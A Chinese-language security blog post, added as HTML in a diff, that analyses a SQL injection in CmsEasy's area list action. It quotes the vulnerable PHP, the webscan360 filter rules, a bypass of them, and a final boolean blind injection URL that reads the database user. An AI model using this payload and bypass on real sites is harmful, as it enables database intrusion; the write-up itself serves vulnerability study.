@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PHP," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="漏洞分析首先看到/lib/default/area_act.php 12345678910111213141516171819202122232425262728293031323334353637383940414243function list_action() &amp;#123;    $this-&amp;g">
+<meta name="keywords" content="PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CmsEasy 前台SQL注入漏洞">
+<meta property="og:url" content="https://badgsd.github.io/2017/08/14/CmsEasy-前台SQL注入漏洞/index.html">
+<meta property="og:site_name" content="Badcode">
+<meta property="og:description" content="漏洞分析首先看到/lib/default/area_act.php 12345678910111213141516171819202122232425262728293031323334353637383940414243function list_action() &amp;#123;    $this-&amp;gt;view-&amp;gt;page=front::get(&apos;page&apos;) ?front::get(&apos;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://badgsd.github.io/2017/08/14/CmsEasy-前台SQL注入漏洞/1.png">
+<meta property="og:image" content="https://badgsd.github.io/2017/08/14/CmsEasy-前台SQL注入漏洞/2.png">
+<meta property="og:image" content="https://badgsd.github.io/2017/08/14/CmsEasy-前台SQL注入漏洞/3.png">
+<meta property="og:image" content="https://badgsd.github.io/2017/08/14/CmsEasy-前台SQL注入漏洞/4.png">
+<meta property="og:updated_time" content="2018-08-31T16:58:07.045Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CmsEasy 前台SQL注入漏洞">
+<meta name="twitter:description" content="漏洞分析首先看到/lib/default/area_act.php 12345678910111213141516171819202122232425262728293031323334353637383940414243function list_action() &amp;#123;    $this-&amp;gt;view-&amp;gt;page=front::get(&apos;page&apos;) ?front::get(&apos;">
+<meta name="twitter:image" content="https://badgsd.github.io/2017/08/14/CmsEasy-前台SQL注入漏洞/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://badgsd.github.io/2017/08/14/CmsEasy-前台SQL注入漏洞/"/>
+
+
+
+
+
+  <title>CmsEasy 前台SQL注入漏洞 | Badcode</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Badcode</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://badgsd.github.io/2017/08/14/CmsEasy-前台SQL注入漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Badcode">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Badcode">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CmsEasy 前台SQL注入漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-14T00:55:31+08:00">
+                2017-08-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看到<code>/lib/default/area_act.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">list_action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;page=front::get(<span class="string">'page'</span>) ?front::get(<span class="string">'page'</span>) : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;pagesize=config::get(<span class="string">'list_pagesize'</span>);</span><br><span class="line">    $limit=((<span class="keyword">$this</span>-&gt;view-&gt;page <span class="number">-1</span>) * <span class="keyword">$this</span>-&gt;pagesize).<span class="string">','</span>.<span class="keyword">$this</span>-&gt;pagesize;</span><br><span class="line">    $area=<span class="keyword">new</span> area();</span><br><span class="line">    $where=<span class="string">'1'</span>;</span><br><span class="line">    <span class="keyword">if</span> (front::get(<span class="string">'province_id'</span>)) $where.=<span class="string">' and id='</span>.front::get(<span class="string">'province_id'</span>);</span><br><span class="line">    <span class="keyword">if</span> (front::get(<span class="string">'city_id'</span>)) $where.=<span class="string">' and id='</span>.front::get(<span class="string">'city_id'</span>);</span><br><span class="line">    <span class="keyword">if</span> (front::get(<span class="string">'section_id'</span>)) $where.=<span class="string">' and id='</span>.front::get(<span class="string">'section_id'</span>);</span><br><span class="line">    <span class="keyword">if</span> (front::get(<span class="string">'id'</span>)) $where.=<span class="string">' and id='</span>.front::get(<span class="string">'id'</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;area=$area-&gt;getrow($where);</span><br><span class="line">    $archive=<span class="keyword">new</span> archive();</span><br><span class="line">    $where=<span class="string">'1'</span>;</span><br><span class="line">    <span class="keyword">if</span> (front::get(<span class="string">'province_id'</span>)) $where.=<span class="string">' and province_id='</span>.front::get(<span class="string">'province_id'</span>);</span><br><span class="line">    <span class="keyword">if</span> (front::get(<span class="string">'city_id'</span>)) $where.=<span class="string">' and city_id='</span>.front::get(<span class="string">'city_id'</span>);</span><br><span class="line">    <span class="keyword">if</span> (front::get(<span class="string">'section_id'</span>)) $where.=<span class="string">' and section_id='</span>.front::get(<span class="string">'section_id'</span>);</span><br><span class="line">    <span class="keyword">if</span> (front::get(<span class="string">'id'</span>)) $where.=<span class="string">' and section_id='</span>.front::get(<span class="string">'id'</span>).<span class="string">' or city_id='</span>.front::get(<span class="string">'id'</span>).<span class="string">' or province_id='</span>.front::get(<span class="string">'id'</span>);</span><br><span class="line">    $archives=$archive-&gt;getrows($where,$limit,<span class="string">'listorder,aid desc'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($archives <span class="keyword">as</span> $order=&gt;$arc) &#123;</span><br><span class="line">        $archives[$order][<span class="string">'url'</span>]=archive::url($arc);</span><br><span class="line">        $archives[$order][<span class="string">'catname'</span>]=category::name($arc[<span class="string">'catid'</span>]);</span><br><span class="line">        $archives[$order][<span class="string">'caturl'</span>]=category::url($arc[<span class="string">'catid'</span>]);</span><br><span class="line">        $archives[$order][<span class="string">'adddate'</span>]=sdate($arc[<span class="string">'adddate'</span>]);</span><br><span class="line">        $archives[$order][<span class="string">'stitle'</span>]=strip_tags($arc[<span class="string">'title'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;pages=<span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(front::get(<span class="string">'id'</span>)!=<span class="string">''</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;areaid=front::get(<span class="string">'id'</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(front::get(<span class="string">'province_id'</span>)!=<span class="string">''</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;areaid=front::get(<span class="string">'province_id'</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(front::get(<span class="string">'city_id'</span>)!=<span class="string">''</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;areaid=front::get(<span class="string">'city_id'</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(front::get(<span class="string">'section_id'</span>)!=<span class="string">''</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;areaid=front::get(<span class="string">'section_id'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;archive[<span class="string">'title'</span>] = area::name(<span class="keyword">$this</span>-&gt;view-&gt;areaid);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;archives=$archives;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;record_count=$archive-&gt;rec_count($where);</span><br><span class="line">    front::$record_count=<span class="keyword">$this</span>-&gt;view-&gt;record_count;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">$this</span>-&gt;render();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>province_id</code>，<code>city_id</code>，<code>section_id</code>，<code>id</code>都是从GET请求中获取的，和<code>where</code>拼接，注意，此时相关id值都是没有用单引号包裹起来的。拼接<code>where</code>之后直接调用<code>getrow()</code>方法，跟进</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getrow</span><span class="params">($condition,$order=<span class="string">'1 desc'</span>,$cols=<span class="string">'*'</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;condition($condition);</span><br><span class="line">    <span class="comment">//var_dump($condition);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;rec_select_one($condition,<span class="string">'*'</span>,$order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，上面拼接的<code>where</code>就调用<code>condition</code>处理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">condition</span><span class="params">(&amp;$condition)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($condition) &amp;&amp;is_array($condition)) &#123;</span><br><span class="line">        $_condition=<span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span> ($condition <span class="keyword">as</span> $key=&gt;$value) &#123;</span><br><span class="line">            <span class="comment">//$value=str_replace("'","\'",$value);</span></span><br><span class="line">            $key = htmlspecialchars($key,ENT_QUOTES);</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">'/(if|select|ascii|from|sleep)/i'</span>, $value))&#123;</span><br><span class="line">                <span class="comment">//echo $condition;</span></span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">'sql inject'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">'/(if|select|ascii|from|sleep)/i'</span>, $key))&#123;</span><br><span class="line">                <span class="comment">//echo $condition;</span></span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">'sql inject'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $_condition[]=<span class="string">"`$key`='$value'"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $condition=implode(<span class="string">' and '</span>,$_condition);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (is_numeric($condition)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(if|select|ascii|from|sleep)/i'</span>, $condition))&#123;</span><br><span class="line">            <span class="comment">//echo $condition;</span></span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">'sql inject'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;getFields();</span><br><span class="line">        $condition=<span class="string">"`$this-&gt;primary_key`='$condition'"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">true</span> === $condition)&#123;</span><br><span class="line">    	$condition = <span class="string">'true'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="comment">//echo $condition." __ ";</span></span><br><span class="line">    	<span class="keyword">if</span>(preg_match(<span class="string">'/(if|select|ascii|from|sleep)/i'</span>, $condition))&#123;</span><br><span class="line">    		<span class="comment">//echo $condition;</span></span><br><span class="line">    		<span class="keyword">exit</span>(<span class="string">'sql inject'</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">if</span> (get_class(<span class="keyword">$this</span>) == <span class="string">'archive'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!front::get(<span class="string">'deletestate'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($condition)</span><br><span class="line">                $condition.=<span class="string">' and (state IS NULL or state&lt;&gt;\'-1\') '</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                $condition=<span class="string">'state IS NULL or state&lt;&gt;\'-1\' '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ($condition)</span><br><span class="line">                $condition.=<span class="string">' and state=\'-1\' '</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                $condition=<span class="string">' state=\'-1\' '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，<code>where</code>传进来之后会有先用<code>htmlspecialchars</code>转义，然后进行关键字检测，这里给后面的exp构造造成了不少困扰。回到<code>getrow</code>函数，进入到<code>rec_select_one</code>函数，跟进</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rec_select_one</span><span class="params">($where,$fields=<span class="string">"*"</span>,$order=<span class="string">"id"</span>)</span> </span>&#123;</span><br><span class="line">    $tbname=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    $sql=<span class="keyword">$this</span>-&gt;sql_select($tbname,$where,<span class="number">1</span>,$fields,$order);</span><br><span class="line">    <span class="comment">//echo $sql."&lt;br&gt;";</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;rec_query_one($sql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在这里面就是拼接SQL语句了，之后调用<code>rec_query_one</code>函数执行SQL语句。</p>
+<p>整个SQL的流程大致就是这样，接下来就是构造exp了，也是最麻烦的一点，因为CmsEasy 用了webscan360。</p>
+<p>首先需要调用到<code>list_action</code>方法的话，根据路由规则，可构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/cmseasy/index.php?case=area&amp;act=list&amp;id=1</span><br></pre></td></tr></table></figure>
+<p>可以从mysql日志中看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `b_area`  WHERE 1 and id=1 ORDER BY 1 desc limit 1</span><br></pre></td></tr></table></figure>
+<p>和上面的流程是一样的，id可控，这里CmsEasy是做了容错的，所以没有办法使用报错注入(此处可以用updatexml报错方法让CmsEasy出错，可绕过360webscan，数据库会报错，但是前台不显示)，所以此处只有使用布尔盲注。</p>
+<p>首先看一下webscan360的拦截规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\&lt;.+javascript:window\\[.&#123;1&#125;\\\\x|&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*(data|src)=data:text\\/html.*&gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\()|&lt;[a-z]+?\\b[^&gt;]*?\\bon([a-z]&#123;4,&#125;)\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)&apos;\&quot;\\d]+?=[\\(\\)&apos;\&quot;\\d]+?|[\\(\\)&apos;\&quot;a-zA-Z]+?=[\\(\\)&apos;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&apos;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@&#123;1,2&#125;.+?\s*|\s+?.+?|(`|&apos;|\&quot;).*?(`|&apos;|\&quot;)\s*)|UPDATE\s*(\(.+\)\s*|@&#123;1,2&#125;.+?\s*|\s+?.+?|(`|&apos;|\&quot;).*?(`|&apos;|\&quot;)\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@&#123;0,2&#125;(\\(.+\\)|\\s+?.+?\\s+?|(`|&apos;|\&quot;).*?(`|&apos;|\&quot;))FROM(\\(.+\\)|\\s+?.+?|(`|&apos;|\&quot;).*?(`|&apos;|\&quot;))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span><br></pre></td></tr></table></figure>
+<p>这里布尔盲注的话需要使用and或者or，所以我们看一下相关规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\b(and|or)\\b\\s*?([\\(\\)&apos;\&quot;\\d]+?=[\\(\\)&apos;\&quot;\\d]+?|[\\(\\)&apos;\&quot;a-zA-Z]+?=[\\(\\)&apos;\&quot;a-zA-Z]+?</span><br></pre></td></tr></table></figure>
+<p>这里非常有意思</p>
+<p>当输入<code>or 1=1</code>时，360webscan会检测到，输入<code>or a=a</code>也会检测到。但是当输入 <code>or a=1</code>时，就可以绕过了，这也是payload构造的关键。</p>
+<p><img src="1.png" alt=""></p>
+<p><img src="2.png" alt=""></p>
+<p>所以我们可以使用<code>ord(mid(user(),1,1))=114</code>来绕过360webscan，使用这个payload也不会触发上面<code>condition</code> 函数里的关键字检测。</p>
+<p>所以最终的payload是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/cmseasy/index.php?case=area&amp;act=list&amp;id=1%20or%20ord(mid(user(),1,1))=114</span><br></pre></td></tr></table></figure>
+<p>数据库的用户是<code>root@localhost</code>，第一个字符是<code>r</code>，对应的ascii是114，可以看下实际测试</p>
+<p>当条件为真时，返回结果如下</p>
+<p><img src="3.png" alt=""></p>
+<p>当条件为假时，返回如下</p>
+<p><img src="4.png" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/06/16/PHP代码审计之SQL注入漏洞/" rel="next" title="PHP代码审计之SQL注入漏洞">
+                <i class="fa fa-chevron-left"></i> PHP代码审计之SQL注入漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/14/记-SerialKillerBypassGadgetCollection-编译过程/" rel="prev" title="记 SerialKillerBypassGadgetCollection 编译过程">
+                记 SerialKillerBypassGadgetCollection 编译过程 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Badcode</p>
+              <p class="site-description motion-element" itemprop="description">学习经历</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.</span> <span class="nav-text">漏洞分析</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Badcode</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
